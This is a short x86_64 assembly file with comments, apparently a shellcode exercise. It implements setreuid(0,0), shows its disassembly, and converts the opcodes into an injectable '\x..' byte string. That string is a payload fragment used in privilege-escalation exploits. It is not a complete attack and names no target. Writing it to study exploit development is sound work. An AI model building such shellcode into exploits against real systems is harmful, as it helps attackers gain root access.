; Chase Hatch 2019 redux this turkey baster
; setreuid(0,0);
; x86_64 parameters order: rdi, rsi, rdx, r10, r8, and r9
; nasm -f elf64 setreuid_64.nasm -o setreuid_64.o
; ld setreuid_64.o -o setreuid_64.elf 



section .text
global _start
_start:

	xor rax, rax
	push rax
	pop rdi
	push rax
	pop rsi
	mov al, 113
	syscall



;;;  fgrep setreuid /usr/include/asm/unistd_64.h
;;;  #define __NR_setreuid 113

;;;  objdump -d setreuid_64.elf
;;;  0000000000401000 <_start>:
;;;    401000:       48 31 c0                xor    %rax,%rax
;;;    401003:       50                      push   %rax
;;;    401004:       5f                      pop    %rdi
;;;    401005:       50                      push   %rax
;;;    401006:       5e                      pop    %rsi
;;;    401007:       b0 71                   mov    $0x71,%al
;;;    401009:       0f 05                   syscall
;;;  
;;;  echo """\
;;;   48 31 c0
;;;   50      
;;;   5f      
;;;   50      
;;;   5e      
;;;   b0 71   
;;;   0f 05   """ |tr -d $'\n' |sed -re 's/[ ]+/ /g' -e 's/[ ]+$//g' -e 's/ /\\x/g'
;;;  \x48\x31\xc0\x50\x5f\x50\x5e\xb0\x71\x0f\x05



